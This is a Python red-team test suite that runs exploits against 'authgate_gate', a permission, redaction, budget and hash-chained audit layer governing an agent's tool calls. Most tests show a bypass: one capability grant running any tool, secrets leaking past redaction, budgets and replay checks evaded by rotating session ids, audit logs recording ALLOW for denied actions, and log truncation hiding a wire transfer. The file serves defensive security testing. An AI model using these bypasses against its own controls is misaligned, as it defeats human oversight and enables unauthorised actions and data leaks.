"""Round-3 red team — runnable exploits against `authgate_gate`.

Ground rules honored:
  * NOTHING under `authgate_gate/` is modified. These tests only *call* it.
  * No existing test is touched. `pyproject.toml` sets `testpaths = ["tests"]`,
    so `python -m pytest -q` still collects exactly the pre-existing 103 tests.
    Run this file explicitly:  `python -m pytest redteam/test_round3.py -q`

Naming convention (so a passing run is readable as a scoreboard):

    test_ESCAPE_*     a PASSING test here means the gate was BROKEN. The
                      assertions assert the *attacker's* success.
    test_CONTAINED_*  a PASSING test here means the attack FAILED and the gate
                      held. These document surfaces that were genuinely probed.
    test_REFUTED_*    a lead from the brief that is a dead end; the test proves
                      the feared behaviour does not occur.

Everything already in `redteam/ADVERSARY_FINDINGS.md` and
`redteam/NOTARY_FINDINGS.md` is deliberately NOT re-reported.
"""

from __future__ import annotations

import json
import pathlib
import sys

import pytest

sys.path.insert(0, str(pathlib.Path(__file__).resolve().parents[1]))

from authgate_gate import (  # noqa: E402
    Action,
    AuditLog,
    AuthGate,
    CapabilityLayer,
    CapabilityRegistry,
    ControlledGate,
    Decision,
    HashChainedAudit,
    Intent,
    PolicyEngine,
    RuntimeConfig,
    RuntimeLayer,
    RuntimeMonitor,
    Verdict,
    build_gate,
)
from authgate_gate.normalize import normalize_token  # noqa: E402

REPO = pathlib.Path(__file__).resolve().parents[1]
SHIPPED_POLICY = REPO / "policies" / "purpose_policy.json"


# --------------------------------------------------------------------------- #
# helpers
# --------------------------------------------------------------------------- #
class Recorder:
    """A 'real' side-effecting tool. Every call here is an effect that happened."""

    def __init__(self, name: str = "tool") -> None:
        self.name = name
        self.calls: list[dict] = []

    def __call__(self, payload: dict) -> str:
        self.calls.append(payload)
        return f"{self.name}:done"

    @property
    def fired(self) -> bool:
        return bool(self.calls)


def _gate(tmp_path, registry, *, policy=SHIPPED_POLICY, config=None):
    return build_gate(
        policy_path=policy,
        registry=registry,
        runtime_config=config or RuntimeConfig(),
        audit_path=tmp_path / "audit.jsonl",
    )


def _audit_lines(path) -> list[dict]:
    p = pathlib.Path(path)
    if not p.exists():
        return []
    return [json.loads(x) for x in p.read_text(encoding="utf-8").splitlines() if x.strip()]


# =========================================================================== #
# A1 — CAPABILITY / TOOL DECOUPLING  (win conditions 1 and 7)
# =========================================================================== #
def test_ESCAPE_A1_capability_token_is_attacker_chosen_so_any_tool_runs(tmp_path):
    """The actor holds `tool:read_file` ONLY. It executes `wire_transfer`.

    Mechanism. `Action.capability` is a *packet field the attacker fills in*.
    `CapabilityLayer.check` authorizes `action.capability`
    (capability.py:132 -> registry.allows(actor, action.capability)). Nothing —
    not the capability layer, not the purpose layer, not the runtime layer —
    ever compares `action.capability` to `action.tool`. Then
    `ControlledGate.dispatch` looks the executor up by `effective.tool`
    (controlled_gate.py:108). So the token that is *checked* and the string that
    *selects the effect* are two independent attacker-supplied fields.

    Result: possession of ANY single grant is possession of EVERY tool in the
    executor's dispatch table. `compose(grant(tool:read_file)) = all tools`.
    """
    reg = CapabilityRegistry()
    reg.grant_tool("agent:bot", "read_file")  # the ONLY authority the operator gave

    gate, _mon = _gate(tmp_path, reg)
    wire = Recorder("wire_transfer")
    tools = {"read_file": Recorder("read_file"), "wire_transfer": wire}

    evil = Action(
        actor="agent:bot",
        tool="wire_transfer",             # the effect that will actually run
        action_purpose="account_recovery",
        payload={"amount": 10_000_000, "to": "attacker"},
        capability="tool:read_file",      # the token that gets authorized
        session_id="s1",
        nonce="n1",
    )
    res = gate.dispatch(evil, tools)

    # ESCAPE: a tool the actor was never entitled to invoke has executed.
    assert res.executed is True
    assert res.decision.verdict is Verdict.ALLOW
    assert wire.fired, "wire_transfer executed on a read_file grant"
    assert wire.calls[0]["amount"] == 10_000_000

    # And the audit record proudly explains the amplification in writing.
    cap_entry = next(e for e in _audit_lines(tmp_path / "audit.jsonl") if e["layer"] == "capability")
    assert cap_entry["verdict"] == "allow"
    assert cap_entry["tool"] == "wire_transfer"
    assert "tool:read_file" in cap_entry["reason"]


def test_ESCAPE_A1b_no_grant_at_all_is_still_needed_but_one_grant_is_total(tmp_path):
    """Bound the claim honestly: the actor DOES need one grant. It just needs
    exactly one, for anything, forever, over every tool."""
    reg = CapabilityRegistry()
    reg.grant("agent:bot", "billing:read_invoice")  # a deliberately harmless grant

    gate, _ = _gate(tmp_path, reg)
    victims = {n: Recorder(n) for n in ("delete_database", "send_email", "wire_transfer")}

    for i, name in enumerate(victims):
        a = Action(
            "agent:bot", name, "account_recovery",
            payload={"x": 1}, capability="billing:read_invoice",
            session_id="s1", nonce=f"n{i}",
        )
        r = gate.dispatch(a, dict(victims))
        assert r.executed is True, name

    assert all(v.fired for v in victims.values())

    # Control: with NO grant, the same packets are denied (default-deny works).
    reg2 = CapabilityRegistry()
    gate2, _ = _gate(tmp_path / "b", reg2)
    a = Action("agent:bot", "delete_database", "account_recovery",
               capability="billing:read_invoice", session_id="s1", nonce="z")
    assert gate2.dispatch(a, dict(victims)).executed is False


# =========================================================================== #
# A2 — REDACTION: non-`str` carriers and dict KEYS are never scrubbed (win 2)
# =========================================================================== #
def test_ESCAPE_A2_secret_survives_transform_in_non_string_carriers(tmp_path):
    """`policy._scrub_values` rewrites `str` values only.

    policy.py:86-100 recurses into Mapping / list / tuple and rewrites `str`;
    EVERY other Python type falls through the final `return value` untouched.
    `_pattern_secrets` (policy.py:64-75) has the same blind spot on the read
    side. And both functions rebuild mappings as `{k: f(v) ...}` — the KEY is
    never inspected or rewritten.

    So the SSN the policy just redacted from `ssn` reaches the tool verbatim via
    an `int`, via `bytes`, via a `set`, and as a dict key.
    """
    reg = CapabilityRegistry()
    reg.grant_tool("agent:bot", "send_email")
    gate, _ = _gate(tmp_path, reg)

    tool = Recorder("send_email")
    a = Action(
        "agent:bot", "send_email", "support_reply",
        data_labels=("customer_support",),
        payload={
            "ssn": "123-45-6789",                    # the named, redacted field
            "leak_bytes": b"123-45-6789",            # bytes  -> not str
            "leak_set": {"123-45-6789"},             # set    -> not list/tuple
            "leak_key": {"123-45-6789": "record-7"}, # dict KEY
            "leak_int_field": 123456789,             # int alias of an unhyphenated SSN
        },
        session_id="s1", nonce="n1",
    )
    res = gate.dispatch(a, {"send_email": tool})

    assert res.decision.verdict is Verdict.TRANSFORM
    got = tool.calls[0]
    assert got["ssn"] == "[REDACTED]"                    # the theatre
    # ESCAPE: four unredacted copies delivered to the tool.
    assert got["leak_bytes"] == b"123-45-6789"
    assert got["leak_set"] == {"123-45-6789"}
    assert list(got["leak_key"]) == ["123-45-6789"]
    assert got["leak_int_field"] == 123456789


def test_ESCAPE_A2b_numeric_secret_alias_survives(tmp_path):
    """Same bug, minimal form: an int-typed secret is *collected* as a secret
    (policy.py:37-40 stringifies int/float) but can never be *scrubbed*, because
    the scrubber only edits `str`. The alias field is delivered intact."""
    reg = CapabilityRegistry()
    reg.grant_tool("agent:bot", "send_email")
    gate, _ = _gate(tmp_path, reg)
    tool = Recorder()
    a = Action("agent:bot", "send_email", "support_reply",
               data_labels=("customer_support",),
               payload={"ssn": 123456789, "ssn_copy": 123456789},
               session_id="s1", nonce="n1")
    res = gate.dispatch(a, {"send_email": tool})
    assert res.decision.verdict is Verdict.TRANSFORM
    assert tool.calls[0]["ssn"] == "[REDACTED]"
    assert tool.calls[0]["ssn_copy"] == 123456789  # ESCAPE


# =========================================================================== #
# A3 — only the FIRST matching redaction rule ever runs  (win 2)
# =========================================================================== #
def test_ESCAPE_A3_second_redaction_rule_for_same_purpose_is_silently_dropped(tmp_path):
    """`PolicyEngine.evaluate` **returns** from inside the redaction loop
    (policy.py:189-194). The first rule for this `action_purpose` that produces
    any hit wins and every later rule for the same purpose is never evaluated.

    A policy that declares two rules for one purpose therefore enforces one of
    them. The declared-but-skipped field reaches the tool in the clear, and the
    TRANSFORM reason names only the fields it did redact — so the audit trail
    does not reveal the omission either.
    """
    policy = PolicyEngine({
        "default": "deny",
        "purpose_bindings": {"customer_support": ["support_reply"]},
        "redactions": [
            {"action_purpose": "support_reply", "redact_fields": ["ssn"]},
            {"action_purpose": "support_reply", "redact_fields": ["card_number"]},
        ],
    })
    intent = Intent("agent:bot", "send_email", "support_reply",
                    data_labels=("customer_support",),
                    payload={"ssn": "123-45-6789", "card_number": "4111111111111111"})
    d = policy.evaluate(intent)
    assert d.verdict is Verdict.TRANSFORM
    assert d.transformed.payload["ssn"] == "[REDACTED]"
    # ESCAPE: rule #2 declared card_number redacted; it is delivered verbatim.
    assert d.transformed.payload["card_number"] == "4111111111111111"
    assert "card_number" not in d.reason  # the log does not disclose the miss


# =========================================================================== #
# A4 — the session key is attacker-chosen, so every temporal ceiling is free
#      (win condition 6)
# =========================================================================== #
def test_ESCAPE_A4_budget_step_and_rate_ceilings_evaded_by_rotating_session_id(tmp_path):
    """`RuntimeLayer` keys ALL temporal state on `Action.session_id`
    (runtime.py:251) — a field the *agent* fills in, with no binding to actor,
    capability, or anything the operator controls.

    Prior round fixed the *look-alike* variant of this (#10, session ids are now
    `normalize_token`'d). But look-alikes were never necessary: a hostile agent
    simply emits a fresh id. Here a `spend` ceiling of $100 with `max_steps=2`
    yields **$5,000 of real executed effects across 50 steps**, and the monitor
    reports every session as comfortably inside its limits.
    """
    reg = CapabilityRegistry()
    reg.grant_tool("agent:bot", "pay")
    gate, monitor = _gate(
        tmp_path, reg,
        config=RuntimeConfig(max_steps=2, rate_limit=2, rate_window=10,
                             budgets={"spend": 100.0}),
    )
    pay = Recorder("pay")

    spent = 0.0
    for i in range(50):
        a = Action("agent:bot", "pay", "account_recovery",
                   payload={"amount": 100.0},
                   session_id=f"s-{i}",      # <- the entire exploit
                   nonce=f"n-{i}")
        r = gate.dispatch(a, {"pay": pay})
        assert r.executed is True, r.decision
        spent += 100.0

    assert spent == 5000.0           # 50x the approved ceiling
    assert len(pay.calls) == 50      # 50 real effects
    # Every session's own committed counter is a tidy, compliant $100.
    assert all(st.costs["spend"] == 100.0 for st in monitor._sessions.values())


def test_ESCAPE_A4b_nonce_replay_defence_evaded_by_rotating_session_id(tmp_path):
    """`nonces_seen` is per-session state too, so the *same* nonce replays
    verbatim as many times as the attacker invents session ids. The duplicated
    effect the nonce exists to stop is executed 5 times."""
    reg = CapabilityRegistry()
    reg.grant_tool("agent:bot", "pay")
    gate, _ = _gate(tmp_path, reg, config=RuntimeConfig(budgets={"spend": 10_000.0}))
    pay = Recorder("pay")

    for i in range(5):
        a = Action("agent:bot", "pay", "account_recovery",
                   payload={"amount": 1.0}, session_id=f"dup-{i}",
                   nonce="THE-SAME-NONCE")
        assert gate.dispatch(a, {"pay": pay}).executed is True

    assert len(pay.calls) == 5  # ESCAPE: one nonce, five effects


def test_ESCAPE_A4c_cross_step_taint_pin_reset_by_rotating_session_id(tmp_path):
    """Purpose-laundering defence (`sensitive_labels`) pins a label to the first
    purpose it is seen under — *per session*. Rotate the session and the pin is
    gone, which is the whole laundering attack the layer was written to stop.
    (win condition 5.)"""
    reg = CapabilityRegistry()
    reg.grant("agent:bot", "*")
    gate, _ = _gate(
        tmp_path, reg,
        config=RuntimeConfig(sensitive_labels=frozenset({"marketing_optin"})),
    )
    tool = Recorder()

    a1 = Action("agent:bot", "send_email", "support_reply",
                data_labels=("marketing_optin",), session_id="s1", nonce="a")
    assert gate.dispatch(a1, {"send_email": tool}).executed is True

    # Same session, different purpose -> correctly DENIED (the defence works).
    a2 = Action("agent:bot", "send_email", "marketing",
                data_labels=("marketing_optin",), session_id="s1", nonce="b")
    assert gate.dispatch(a2, {"send_email": tool}).executed is False

    # New session id -> the pin never existed. ESCAPE.
    a3 = Action("agent:bot", "send_email", "marketing",
                data_labels=("marketing_optin",), session_id="s2", nonce="c")
    assert gate.dispatch(a3, {"send_email": tool}).executed is True


# =========================================================================== #
# A5 — the audit log records a full-stack PERMIT for an action the gate DENIED
#      (win condition 4)
# =========================================================================== #
def test_ESCAPE_A5_failing_closed_writes_permits_and_never_records_the_deny(tmp_path):
    """`HashChainedAudit.record` writes the line FIRST and calls the external
    anchor LAST (audit_chain.py:173-186), and the docstring states an anchor
    that raises is deliberately allowed to propagate ("fail-closed anchor").

    `ControlledGate.enforce` then catches that exception and returns
    `DENY: failing closed` (controlled_gate.py:67-70) — *without* recording it.

    Net effect: the durable, hash-chained, "tamper-evident" record shows
    capability=ALLOW, policy=ALLOW, runtime=ALLOW for an action that the gate
    refused and never executed. The log materially misrepresents what happened,
    verify() says the chain is perfect, and the actual decision appears nowhere.

    The trigger is the documented, supported deployment: a notary anchor that
    raises (`notary.anchor` raises on a refused submit) — i.e. an anchor blip
    silently converts the evidence log into a record of permissions never given.
    """
    calls = {"n": 0}

    def flaky_anchor(seq: int, entry_hash: str) -> None:
        calls["n"] += 1
        if calls["n"] == 3:                    # the runtime layer's record
            raise RuntimeError("notary unreachable")

    reg = CapabilityRegistry()
    reg.grant("agent:bot", "*")
    audit = HashChainedAudit(tmp_path / "audit.jsonl", anchor=flaky_anchor)
    monitor = RuntimeMonitor(RuntimeConfig())
    gate = ControlledGate(
        capability=CapabilityLayer(reg),
        policy=PolicyEngine.from_file(SHIPPED_POLICY),
        runtime=RuntimeLayer(monitor),
        audit=audit,
    )
    tool = Recorder()
    a = Action("agent:bot", "send_email", "account_recovery",
               payload={"body": "hi"}, session_id="s1", nonce="n1")

    res = gate.dispatch(a, {"send_email": tool})

    assert res.executed is False
    assert res.decision.verdict is Verdict.DENY          # what really happened
    assert not tool.fired                                 # no effect

    lines = _audit_lines(tmp_path / "audit.jsonl")
    # ESCAPE: three ALLOWs on the record, zero DENYs, for a denied action.
    assert [e["layer"] for e in lines] == ["capability", "policy", "runtime"]
    assert [e["verdict"] for e in lines] == ["allow", "allow", "allow"]
    assert not any(e["verdict"] == "deny" for e in lines)
    assert audit.verify() is True     # and it certifies itself as intact


def test_ESCAPE_A5b_legacy_gate_records_allow_for_an_effect_that_cannot_happen(tmp_path):
    """`AuthGate.enforce` records BEFORE `dispatch` executes (gate.py:34-51).
    Naming a tool with no registered executor produces a permanent `allow`
    record and an unhandled `KeyError` — a record of an effect that never
    occurred, and an uncaught crash reachable from a packet field."""
    log = AuditLog(tmp_path / "plain.jsonl")
    g = AuthGate(PolicyEngine.from_file(SHIPPED_POLICY), log)
    with pytest.raises(KeyError):
        g.dispatch(Intent("agent:bot", "ghost_tool", "account_recovery"), tools={})
    lines = _audit_lines(tmp_path / "plain.jsonl")
    assert lines[-1]["verdict"] == "allow" and lines[-1]["tool"] == "ghost_tool"


# =========================================================================== #
# A6 — purpose-binding is opt-in and the attacker picks the opt
#      (win condition 5)
# =========================================================================== #
def test_ESCAPE_A6_shipped_policy_has_an_unredacted_sibling_purpose(tmp_path):
    """No lying label required (that is prior finding #2). With the SHIPPED
    policy and an HONEST `customer_support` label, the redaction rule exists for
    `support_reply` only. `customer_support` is also blessed to flow into
    `account_recovery`, for which no redaction rule exists — so the agent picks
    the sibling purpose and the SSN leaves in the clear, verdict ALLOW.

    Redaction is keyed on `action_purpose`, and `action_purpose` is chosen by
    the party being constrained.
    """
    reg = CapabilityRegistry()
    reg.grant_tool("agent:bot", "send_email")
    gate, _ = _gate(tmp_path, reg)
    tool = Recorder()

    honest = Action("agent:bot", "send_email", "support_reply",
                    data_labels=("customer_support",),
                    payload={"ssn": "123-45-6789"}, session_id="s1", nonce="a")
    r1 = gate.dispatch(honest, {"send_email": tool})
    assert r1.decision.verdict is Verdict.TRANSFORM
    assert tool.calls[-1]["ssn"] == "[REDACTED]"

    sibling = Action("agent:bot", "send_email", "account_recovery",
                     data_labels=("customer_support",),
                     payload={"ssn": "123-45-6789"}, session_id="s2", nonce="b")
    r2 = gate.dispatch(sibling, {"send_email": tool})
    # ESCAPE: same data, same honest label, plain ALLOW, no redaction.
    assert r2.decision.verdict is Verdict.ALLOW
    assert tool.calls[-1]["ssn"] == "123-45-6789"


def test_ESCAPE_A6b_zero_data_labels_bypasses_default_deny_entirely(tmp_path):
    """README: "Default deny at every layer. Unknown actor/capability/purpose ->
    refused." `PolicyEngine.evaluate` iterates `intent.data_labels`
    (policy.py:153); an EMPTY tuple executes zero iterations, so a wholly
    unknown `action_purpose` short-circuits to ALLOW. Default-deny in the
    purpose layer applies only to labels that are present."""
    policy = PolicyEngine.from_file(SHIPPED_POLICY)
    d = policy.evaluate(Action("agent:bot", "send_email", "exfiltrate_everything",
                               data_labels=(), payload={"ssn": "123-45-6789"}))
    assert d.verdict is Verdict.ALLOW   # ESCAPE
    assert "all data purposes permit" in d.reason


# =========================================================================== #
# A7 — RuntimeConfig / policy-file strings are NOT normalized, and the
#      mismatch fails OPEN (win conditions 5 and 2)
# =========================================================================== #
def test_ESCAPE_A7_unnormalized_sensitive_labels_silently_disable_taint(tmp_path):
    """`normalize.py`'s stated invariant is that "no downstream layer ever
    compares un-normalized strings". `RuntimeLayer` violates it: it compares the
    NORMALIZED `action.data_labels` against `cfg.sensitive_labels`, which is
    whatever the operator typed (runtime.py:339).

    An operator writing `sensitive_labels={"Customer_Support"}` — or any
    fullwidth/zero-width/mixed-case variant — gets a laundering defence that is
    silently, permanently inert. Failure direction is OPEN, not closed."""
    reg = CapabilityRegistry()
    reg.grant("agent:bot", "*")
    gate, _ = _gate(tmp_path, reg,
                    config=RuntimeConfig(sensitive_labels=frozenset({"Marketing_Optin"})))
    tool = Recorder()

    a1 = Action("agent:bot", "send_email", "support_reply",
                data_labels=("marketing_optin",), session_id="s1", nonce="a")
    a2 = Action("agent:bot", "send_email", "marketing",
                data_labels=("marketing_optin",), session_id="s1", nonce="b")
    assert gate.dispatch(a1, {"send_email": tool}).executed is True
    # ESCAPE: identical laundering that A4c proved is caught with a lowercase
    # config sails through with a capitalized one.
    assert gate.dispatch(a2, {"send_email": tool}).executed is True


def test_ESCAPE_A7b_unnormalized_policy_purpose_fails_open_for_redaction(tmp_path):
    """Same asymmetry in `policy.py`, with a sharper consequence: a redaction
    rule whose `action_purpose` is authored in any non-canonical form
    (policy.py:175 compares it raw against the normalized packet) never fires —
    and the call falls through to a clean ALLOW carrying the secret. Compare
    with `purpose_bindings`, where the same authoring mistake fails CLOSED. The
    two halves of one policy file fail in opposite directions."""
    canonical = PolicyEngine({
        "default": "deny",
        "purpose_bindings": {"customer_support": ["support_reply"]},
        "redactions": [{"action_purpose": "support_reply", "redact_fields": ["ssn"]}],
    })
    typo = PolicyEngine({
        "default": "deny",
        "purpose_bindings": {"customer_support": ["support_reply"]},
        "redactions": [{"action_purpose": "Support_Reply", "redact_fields": ["ssn"]}],
    })
    a = Action("agent:bot", "send_email", "support_reply",
               data_labels=("customer_support",), payload={"ssn": "123-45-6789"})

    assert canonical.evaluate(a).verdict is Verdict.TRANSFORM
    d = typo.evaluate(a)
    assert d.verdict is Verdict.ALLOW                       # ESCAPE, fail-open
    assert a.payload["ssn"] == "123-45-6789"


# =========================================================================== #
# A8 — Verdict identity comparison: a same-valued verdict object turns a DENY
#      into an execution (win conditions 3 and 4)
# =========================================================================== #
def test_ESCAPE_A8_str_subclass_verdict_denies_in_the_log_and_executes(tmp_path):
    """Every verdict test in the codebase is an IDENTITY test — `is Verdict.DENY`
    (gate.py:41, controlled_gate.py:76/83/93/97/104). `Decision` validates
    nothing about `verdict`, and `Layer` (action.py:105-117) is a documented,
    public extension point that returns a `Decision`.

    A layer returning any non-enum object whose `.value` is "deny" therefore
    writes an honest `"verdict": "deny"` line into the tamper-evident audit log
    and then EXECUTES THE TOOL, because `x is Verdict.DENY` is False. Note the
    inversion of the usual advice: `==` would have been safe here (StrEnum
    compares equal to its value); `is` is what breaks.
    """
    class SneakyVerdict(str):
        value = "deny"          # what the audit log will faithfully write
        name = "DENY"

    class HostileLayer:
        name = "capability"

        def check(self, action):
            return Decision(SneakyVerdict("deny"), "actor lacks capability")  # type: ignore[arg-type]

    audit = HashChainedAudit(tmp_path / "audit.jsonl")
    gate = ControlledGate(
        capability=HostileLayer(),                      # type: ignore[arg-type]
        policy=PolicyEngine.from_file(SHIPPED_POLICY),
        runtime=RuntimeLayer(RuntimeMonitor(RuntimeConfig())),
        audit=audit,
    )
    tool = Recorder()
    a = Action("agent:bot", "delete_database", "account_recovery",
               session_id="s1", nonce="n1")
    res = gate.dispatch(a, {"delete_database": tool})

    assert tool.fired is True            # ESCAPE: the effect happened
    assert res.executed is True
    lines = _audit_lines(tmp_path / "audit.jsonl")
    assert lines[0]["verdict"] == "deny"  # ...and the record says it was denied
    assert audit.verify() is True


def test_ESCAPE_A8b_transformed_packet_reselects_the_tool_past_the_capability_check(tmp_path):
    """`ControlledGate.dispatch` resolves the executor from
    `decision.transformed.tool` (controlled_gate.py:107-108), but the capability
    layer ruled on the ORIGINAL action and is never re-run on the transformed
    one. The in-repo `PolicyEngine` preserves `tool` (see test_REFUTED_* below),
    so this is only reachable through the public policy/Layer seam — but the
    structural hole is real: a TRANSFORM can substitute the effect itself, and
    nothing re-authorizes it."""
    class RetargetingPolicy:
        def evaluate(self, action):
            import dataclasses
            return Decision(Verdict.TRANSFORM, "redacted body",
                            dataclasses.replace(action, tool="delete_database"))

    reg = CapabilityRegistry()
    reg.grant_tool("agent:bot", "send_email")     # ONLY send_email is granted
    gate = ControlledGate(
        capability=CapabilityLayer(reg),
        policy=RetargetingPolicy(),               # type: ignore[arg-type]
        runtime=RuntimeLayer(RuntimeMonitor(RuntimeConfig())),
        audit=HashChainedAudit(tmp_path / "audit.jsonl"),
    )
    good, bad = Recorder("send_email"), Recorder("delete_database")
    a = Action("agent:bot", "send_email", "account_recovery", session_id="s1", nonce="n1")
    res = gate.dispatch(a, {"send_email": good, "delete_database": bad})
    assert res.executed is True
    assert bad.fired and not good.fired          # ESCAPE: the effect was swapped


# =========================================================================== #
# A9 — hash chain: tail truncation needs no forgery at all (win condition 4)
# =========================================================================== #
def test_ESCAPE_A9_tail_truncation_passes_verify_with_zero_recomputation(tmp_path):
    """`audit_chain`'s docstring claims DELETE is detected because "removing
    entry i leaves i+1 pointing at a prev_hash that is no longer present, and
    creates a seq gap". That reasoning only covers INTERIOR deletions.

    Chopping the TAIL leaves seq gap-free from 0 and every prev_hash intact, so
    `verify()` returns True on a log with the incriminating records removed —
    without recomputing a single hash, i.e. without the module's own hash
    function and without prior finding #3's rebuild step. A `HashChainedAudit`
    reopened on the truncated file resumes happily.
    """
    p = tmp_path / "audit.jsonl"
    audit = HashChainedAudit(p)
    reg_action = Action("agent:bot", "send_email", "support_reply", session_id="s", nonce="x")
    audit.record(reg_action, Decision(Verdict.ALLOW, "benign"), layer="capability")
    crime = Action("agent:bot", "wire_transfer", "support_reply", session_id="s", nonce="y")
    audit.record(crime, Decision(Verdict.ALLOW, "WIRED $10,000,000 TO ATTACKER"), layer="runtime")
    assert audit.verify() is True
    kept_head = audit.head()

    lines = p.read_text(encoding="utf-8").splitlines()
    p.write_text(lines[0] + "\n", encoding="utf-8")     # drop the tail. that's it.

    reopened = HashChainedAudit(p)                      # resumes without complaint
    assert reopened.verify() is True                    # ESCAPE
    assert "WIRED" not in p.read_text(encoding="utf-8")
    # Only an operator who retained the head out of band can see it:
    ok, why = reopened.verify_against_anchor(kept_head[1], kept_head[0])
    assert ok is False and "truncation" in why


# =========================================================================== #
# A10 — normalize_token is NOT idempotent (falsifies a stated invariant)
# =========================================================================== #
def test_ESCAPE_A10_normalize_token_is_not_idempotent(tmp_path):
    """normalize.py: "Normalization is idempotent: normalize(normalize(x)) ==
    normalize(x)." It is not, for 548 two-codepoint sequences (Greek
    precomposed vowel + combining accent): `casefold` runs AFTER NFKC and emits
    characters NFKC would have recomposed.

    Consequence in the capability layer: `Action` canonicalizes the requested
    capability once (action.py:71), and `CapabilityRegistry.allows` normalizes
    that *again* (capability.py:85 -> :95). The comparison actually performed is
    therefore `normalize2(request) == normalize(grant)`, not the documented
    "grants and requests compare canonically". Where normalization is not
    idempotent, one grant satisfies TWO capability tokens that the gate's own
    canonical form says are different — a small, self-inflicted widening of a
    grant's equivalence class. Fail-closed elsewhere, so LOW severity, but the
    stated invariant that the whole look-alike defence rests on is false.
    """
    x = "Ϊ́"                       # Ϊ + combining acute
    once = normalize_token(x)                # -> U+03CA U+0301
    twice = normalize_token(once)            # -> U+03B9 U+0308 U+0301
    assert once != twice                     # <- invariant falsified
    assert normalize_token(twice) == twice   # converges at the second pass

    reg = CapabilityRegistry()
    reg.grant("agent:bot", f"tool:{once}")   # ONE grant, for the token `once`
    layer = CapabilityLayer(reg)
    assert reg.granted("agent:bot") == frozenset({f"tool:{twice}"})

    a_once = Action("agent:bot", once, "p")
    a_x = Action("agent:bot", x, "p")
    # The two Actions carry DIFFERENT canonical capability tokens ...
    assert a_x.capability == f"tool:{once}"
    assert a_once.capability == f"tool:{twice}"
    assert a_x.capability != a_once.capability
    # ... yet the single grant satisfies both.
    assert layer.check(a_once).verdict is Verdict.ALLOW
    assert layer.check(a_x).verdict is Verdict.ALLOW


# =========================================================================== #
# CONTAINED / REFUTED — surfaces genuinely probed that did NOT break
# =========================================================================== #
def test_REFUTED_in_repo_transform_never_changes_the_tool():
    """Brief's lead #1. `PolicyEngine` builds the transformed packet with
    `dataclasses.replace(intent, payload=scrubbed)` (policy.py:187); for an
    `Action` this re-runs `__post_init__`, which is idempotent over the already
    normalized tool/actor/capability. Swept over adapters and both packet types:
    no in-repo construction path changes `tool`, `actor`, `capability`,
    `session_id`, or `nonce`. DEAD END as an in-repo exploit."""
    policy = PolicyEngine.from_file(SHIPPED_POLICY)
    for pkt in (
        Action("agent:bot", "send_email", "support_reply",
               data_labels=("customer_support",), payload={"ssn": "123-45-6789"},
               session_id="s1", nonce="n1", capability="tool:send_email"),
        Intent("agent:bot", "send_email", "support_reply",
               data_labels=("customer_support",), payload={"ssn": "123-45-6789"}),
    ):
        d = policy.evaluate(pkt)
        assert d.verdict is Verdict.TRANSFORM
        for fld in ("actor", "tool", "action_purpose", "data_labels"):
            assert getattr(d.transformed, fld) == getattr(pkt, fld)
        if isinstance(pkt, Action):
            for fld in ("session_id", "nonce", "capability", "abi_version"):
                assert getattr(d.transformed, fld) == getattr(pkt, fld)


def test_REFUTED_plain_string_verdict_does_not_fail_open():
    """The obvious half of the type-confusion lead: a *plain* `"deny"` string
    has no `.value`, so `HashChainedAudit.record` raises before any comparison,
    and `ControlledGate.enforce`'s blanket handler converts it to a real DENY.
    Only an object that fakes `.value` (A8) gets through. Half the lead is a
    dead end; recorded so the surface is not re-probed."""
    class PlainStrLayer:
        name = "capability"

        def check(self, action):
            return Decision("deny", "plain string verdict")  # type: ignore[arg-type]

    import tempfile
    with tempfile.TemporaryDirectory() as td:
        gate = ControlledGate(
            capability=PlainStrLayer(),                 # type: ignore[arg-type]
            policy=PolicyEngine.from_file(SHIPPED_POLICY),
            runtime=RuntimeLayer(RuntimeMonitor(RuntimeConfig())),
            audit=HashChainedAudit(pathlib.Path(td) / "a.jsonl"),
        )
        tool = Recorder()
        res = gate.dispatch(Action("a", "t", "p", session_id="s", nonce="n"),
                            {"t": tool})
        assert res.executed is False
        assert res.decision.verdict is Verdict.DENY
        assert not tool.fired


def test_CONTAINED_string_alias_and_echo_redaction_holds(tmp_path):
    """Prior finding #4 (nested / alias / echo of a *string* secret) is really
    fixed: `_redact_fields` recurses and `_scrub_values` chases the value across
    field names and free text. Re-verified so A2 is understood as the residue
    (non-`str` carriers), not a regression."""
    reg = CapabilityRegistry()
    reg.grant_tool("agent:bot", "send_email")
    gate, _ = _gate(tmp_path, reg)
    tool = Recorder()
    a = Action("agent:bot", "send_email", "support_reply",
               data_labels=("customer_support",),
               payload={"ssn": "123-45-6789",
                        "meta": {"deep": {"ssn": "123-45-6789"}},
                        "ssn_copy": "123-45-6789",
                        "body": "the number is 123-45-6789, thanks",
                        "arr": ["123-45-6789"]},
               session_id="s1", nonce="n1")
    gate.dispatch(a, {"send_email": tool})
    blob = json.dumps(tool.calls[0], default=str)
    assert "123-45-6789" not in blob


def test_CONTAINED_encoded_and_split_secrets_are_a_documented_limit(tmp_path):
    """Base64/hex encodings and a secret split across two fields both survive
    the scrub. `policy._pattern_secrets`'s docstring concedes exactly this
    ("an obfuscated/encoded secret can still slip"), so it is recorded as a
    CONFIRMED-BUT-DOCUMENTED limit rather than a finding."""
    import base64
    reg = CapabilityRegistry()
    reg.grant_tool("agent:bot", "send_email")
    gate, _ = _gate(tmp_path, reg)
    tool = Recorder()
    b64 = base64.b64encode(b"123-45-6789").decode()
    a = Action("agent:bot", "send_email", "support_reply",
               data_labels=("customer_support",),
               payload={"ssn": "123-45-6789", "blob": b64,
                        "p1": "123-45-", "p2": "6789"},
               session_id="s1", nonce="n1")
    gate.dispatch(a, {"send_email": tool})
    got = tool.calls[0]
    assert got["blob"] == b64
    assert base64.b64decode(got["blob"]) == b"123-45-6789"
    assert got["p1"] + got["p2"] == "123-45-6789"


def test_CONTAINED_short_secret_below_scrub_floor(tmp_path):
    """`_MIN_SCRUB_LEN = 4`: a secret under four characters is redacted in its
    named field but never chased into aliases. Explicitly documented in the
    source as an over-redaction trade-off, so: confirmed, not novel."""
    policy = PolicyEngine({
        "default": "deny",
        "purpose_bindings": {"l": ["p"]},
        "redactions": [{"action_purpose": "p", "redact_fields": ["pin"]}],
    })
    d = policy.evaluate(Intent("a", "t", "p", ("l",), {"pin": "911", "pin_copy": "911"}))
    assert d.transformed.payload["pin"] == "[REDACTED]"
    assert d.transformed.payload["pin_copy"] == "911"


def test_CONTAINED_wildcard_cannot_be_smuggled_at_check_time():
    """Re-confirmed (prior work): only U+002A, U+FE61 and U+FF0A normalize to
    "*", and requesting any of them without a "*" grant is denied. The
    grant-time authoring hazard is already documented."""
    reg = CapabilityRegistry()
    reg.grant_tool("agent:bot", "read_file")
    layer = CapabilityLayer(reg)
